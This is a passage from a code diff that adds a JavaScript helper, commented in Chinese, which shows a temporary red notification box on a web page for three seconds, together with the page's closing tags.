+    }
+}
+
+// 显示提示消息
+function showTemporaryMessage(message) {
+    const messageDiv = document.createElement('div');
+    messageDiv.textContent = message;
+
+    // 样式
+    messageDiv.style.position = 'fixed';
+    messageDiv.style.top = '38%';
+    messageDiv.style.left = '50%';
+    messageDiv.style.transform = 'translateX(-50%)'; 
+    messageDiv.style.backgroundColor = 'rgba(220, 53, 69, 0.7)';
+    messageDiv.style.color = 'white';
+    messageDiv.style.padding = '10px 20px';
+    messageDiv.style.borderRadius = '4px';
+    messageDiv.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
+    messageDiv.style.zIndex = '1000';
+    messageDiv.style.fontSize = '16px';
+    messageDiv.style.textAlign = 'center';
+    messageDiv.style.maxWidth = '80%';
+    messageDiv.style.maxHeight = '50%';
+    messageDiv.style.overflowY = 'auto';
+    messageDiv.style.wordWrap = 'break-word';
+
+    document.body.appendChild(messageDiv);
+
+    // 显示3秒
+    setTimeout(() => {
+        messageDiv.remove();
+    }, 3000);
+}
+</script>
+</body>
+</html>
